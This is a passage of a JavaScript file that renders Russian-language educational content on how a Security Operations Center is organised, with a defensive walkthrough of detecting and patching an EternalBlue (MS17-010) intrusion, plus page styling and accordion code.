                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Выделение бюджета
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Ресурсы</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Руководство</h3>
              <p><strong>Взаимодействие и эскалация:</strong> Руководство получает отчеты об инцидентах уровня 1 и стратегические рекомендации от L3 через Zoom и Confluence (например, после расследования APT). Руководство согласовывает предложенные меры (например, внедрение новой архитектуры) и выделяет бюджет, уведомляя L3 через Confluence. Руководство также может запросить дополнительные данные у L3 через Zoom, если отчеты требуют уточнений. Косвенно руководство влияет на все уровни SOC, обеспечивая ресурсы для реализации мер.</p>
              <p><strong>Ключевые моменты:</strong> Руководство не взаимодействует напрямую с L1, L2 или другими командами, но их решения влияют на работу всей структуры SOC.</p>
            </div>
          </div>
        </div>

        <h3>Процессы и операции</h3>
        <ul>
          <li><strong>Мониторинг:</strong> Агрегация логов через Splunk, мониторинг сети через Zabbix. Дашборды для отслеживания метрик (трафик, CPU, инциденты).</li>
          <li><strong>Классификация:</strong> Инциденты делятся на уровни 1–5 (1 — критический, 5 — низкий). Пример: DDoS — уровень 1, подозрительный логин — уровень 4.</li>
          <li><strong>Реагирование:</strong> Эскалация инцидентов уровня 1–2 Blue Team в течение 30 минут. Использование SOAR (Demisto) для автоматизации.</li>
          <li><strong>Анализ:</strong> Проведение RCA для инцидентов уровня 1–3. Пример: анализ логов для выявления источника ransomware.</li>
          <li><strong>Отчетность:</strong> Ежемесячные отчеты о KPI (время реакции, точность обнаружения).</li>
        </ul>

        <h3>Пример работы: Обнаружение и устранение уязвимости EternalBlue (MS17-010)</h3>
        <p><strong></strong> L1 зафиксировал аномальный трафик через Splunk на порту 445 (SMB) в 09:15 27 апреля 2025. Дашборд показал >1000 запросов/мин с IP 192.168.1.100, что превысило порог в 500 запросов/мин. Snort сработал на сигнатуру, указывающую на возможный эксплойт. L1 классифицировал инцидент как уровень 2 (подозрение на SMB-эксплойт) и создал тикет в ServiceNow, добавив логи и временные метки, после чего эскалировал его на L2.</p>
        <p><strong></strong> L2 получил тикет в 09:20 и начал анализ с помощью Wireshark, выявив паттерн, характерный для эксплойта EternalBlue (MS17-010), который использует уязвимость в SMBv1 для удаленного выполнения кода. Splunk показал, что сервер 10.0.0.50 (Windows Server 2016) подвергся атаке. L2 запросил IOC у Threat Intelligence через MISP, которые подтвердили, что IP 192.168.1.100 связан с известной кампанией APT28. L2 подтвердил инцидент как уровень 1 (критический) и эскалировал его на L3 через ServiceNow в 09:35, передав данные Wireshark и IOC.</p>
        <p><strong></strong> L2 параллельно изолировал угрозу, заблокировав IP 192.168.1.100 через брандмауэр pfSense в 09:30, чтобы минимизировать ущерб. Blue Team получила рекомендацию от L2 через Confluence и отключила сервер 10.0.0.50 от сети, поместив его в карантин в 09:40, чтобы предотвратить распространение эксплойта на другие системы.</p>
        <p><strong></strong> L3 получил тикет в 09:40 и провел глубокий анализ с помощью Volatility, выявив, что EternalBlue установил бэкдор для связи с C2-сервером. L3 разработал план устранения: Blue Team применила патч MS17-010 на сервере 10.0.0.50 и отключила SMBv1 на всех системах, следуя инструкциям L3 через Confluence. L3 также создал новую сигнатуру YARA для обнаружения бэкдора и передал её Blue Team для обновления правил Snort в 10:00.</p>
        <p><strong></strong> Threat Intelligence предоставила дополнительные TTP APT28 через MISP, которые L3 использовал для разработки долгосрочной стратегии, включая усиление мониторинга SMB-трафика. L3 провел обучение для L1 и L2 через Confluence, акцентируя внимание на признаках EternalBlue. Blue Team подтвердила эффективность мер, сообщив L2 через Confluence, что новые правила Snort успешно блокируют подобные атаки. L3 подготовил отчет для руководства через Zoom в 11:00, согласовав внедрение новой архитектуры IDS для предотвращения подобных инцидентов. Общее время реагирования составило 1 час 45 минут.</p>
      </div>
      <style>
        .osi-table-container {
          overflow-x: auto;
          margin: 20px 0;
        }
        .osi-table {
          width: 100%;
          border-collapse: collapse;
          background-color: #05060a;
          color: #ffffff;
        }
        .osi-table th, .osi-table td {
          border: 1px solid #444;
          padding: 10px;
          text-align: left;
          font-size: 14px;
        }
        .osi-table th {
          background-color: #2a2f3b;
        }
        .osi-table td {
          background-color: #05060a;
        }
        .soc-interaction-diagram {
          min-height: 300px;
        }
        .accordion {
          margin: 20px 0;
        }
        .accordion-item {
          border-bottom: 1px solid #444;
        }
        .accordion-header {
          width: 100%;
          padding: 15px;
          background-color: #2a2f3b;
          color: #ffffff;
          text-align: left;
          font-size: 16px;
          cursor: pointer;
          border: none;
          outline: none;
        }
        .accordion-content {
          display: none;
          padding: 15px;
          background-color: #05060a;
          color: #ffffff;
        }
        .accordion-content.show {
          display: block;
        }
      </style>
    </div>
  `;
  contentArea.innerHTML = socContent;

  // Add accordion functionality
  document.querySelectorAll('.accordion-header').forEach(header => {
    header.addEventListener('click', () => {
      const content = header.nextElementSibling;
      const isOpen = content.style.display === 'block';
      document.querySelectorAll('.accordion-content').forEach(item => {
        item.style.display = 'none';
      });
      content.style.display = isOpen ? 'none' : 'block';
    });
  });

  document.querySelector('.back-btn').addEventListener('click', () => loadTeamsThreatIntelContent(contentArea));
}
